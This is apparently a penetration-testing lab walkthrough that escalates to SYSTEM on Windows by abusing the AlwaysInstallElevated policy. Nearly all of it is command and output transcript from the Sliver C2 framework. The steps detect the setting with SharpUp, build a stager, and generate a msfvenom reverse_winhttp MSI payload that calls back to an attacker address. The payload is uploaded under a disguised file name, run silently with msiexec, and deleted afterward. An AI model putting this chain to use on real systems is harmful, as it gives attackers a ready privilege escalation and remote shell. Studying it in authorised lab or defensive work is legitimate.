# 03 - Sliver AlwaysInstallElevated Exploitation

## 3.1 - Detect

```
sliver (SPATIAL_CLEANER) > sharpup audit AlwaysInstallElevated

[*] Tasked beacon SPATIAL_CLEANER (811c943a)

[+] SPATIAL_CLEANER completed task 811c943a

[*] sharpup output:

=== SharpUp: Running Privilege Escalation Checks ===

=== Always Install Elevated ===
        HKCU: 1
        HKLM: 1



[*] Completed Privesc Checks in 0 seconds
```

## 3.2 - Exploit

```
sliver (SPATIAL_CLEANER) > profiles new -m 10.9.19.98 -l -a x64 -f shellcode msf-stager

[*] Saved new implant profile msf-stager

sliver (SPATIAL_CLEANER) > stage-listener -u http://10.9.19.98:80 -P -p msf-stager

[*] No builds found for profile msf-stager, generating a new one
[*] Job 3 (http) started

user@pentestos:~$ msfvenom -p windows/x64/custom/reverse_winhttp lhost=10.9.19.98 lport=80 luri=/shellcode.woff -f msi -o shell.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 1166 bytes
Final size of msi file: 159744 bytes
Saved as: shell.msi

sliver (SPATIAL_CLEANER) > upload shell.msi c:/users/user/documents/win-package.msi

[*] Tasked beacon SPATIAL_CLEANER (2ab56db9)

[+] SPATIAL_CLEANER completed task 2ab56db9

[*] Wrote file to c:\users\user\documents\win-package.msi

sliver (SPATIAL_CLEANER) > execute msiexec /quiet /qn /i c:\\users\\user\\documents\\win-package.msi

[*] Tasked beacon SPATIAL_CLEANER (17a67d59)

[+] SPATIAL_CLEANER completed task 17a67d59

[*] Output:
[!] Exited with status 1603!

[*] Session 7e81dd8f WILLING_CARTLOAD - 10.10.221.233:49928 (TCM-PC) - windows/amd64 - Thu, 17 Nov 2022 12:31:47 EST

[*] Active session WILLING_CARTLOAD (7e81dd8f)

sliver (WILLING_CARTLOAD) > whoami

Logon ID: NT AUTHORITY\SYSTEM
```

## 3.3 - Cleanup

```
sliver (WILLING_CARTLOAD) > rm c:/users/user/documents/win-package.msi

[*] c:\users\user\documents\win-package.msi
```